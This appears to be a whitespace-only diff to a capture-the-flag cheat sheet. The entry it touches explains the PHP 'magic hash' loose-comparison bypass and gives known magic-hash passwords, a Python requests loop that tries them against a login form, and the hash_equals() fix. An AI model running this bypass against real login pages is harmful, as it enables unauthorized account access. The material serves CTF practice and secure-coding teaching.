@@ -14,7 +14,7 @@ tricks:
     payload: |
       # Vulnerable code pattern:
       # if (md5($_POST['password']) == $result_password)
-      
+
       # Target hash: 0e678703625362188185747119782643
       # This is interpreted as 0^678703625362188185747119782643 = 0
 
@@ -35,10 +35,10 @@ tricks:
     how: "Submit magic hash as password"
     payload: |
       import requests
-      
+
       # Any of these will work
       passwords = ["QNKCDZO", "240610708", "s878926199a"]
-      
+
       for pwd in passwords:
           resp = requests.post(target, data={"password": pwd})
           if "Welcome" in resp.text or "flag" in resp.text:
@@ -53,7 +53,7 @@ tricks:
       # "0e830400451993494058024219903391" == "0e678703625362188185747119782643"
       # Both are interpreted as 0 (zero to any power = 0)
       # So the comparison becomes: 0 == 0 -> true
-      
+
       # Fix: Use strict comparison (===) or hash_equals()
       # if (hash_equals(md5($password), $stored_hash))
 
@@ -66,4 +66,3 @@ tricks:
 
       # SHA256 magic hashes are harder to find
       # but the principle is the same
-
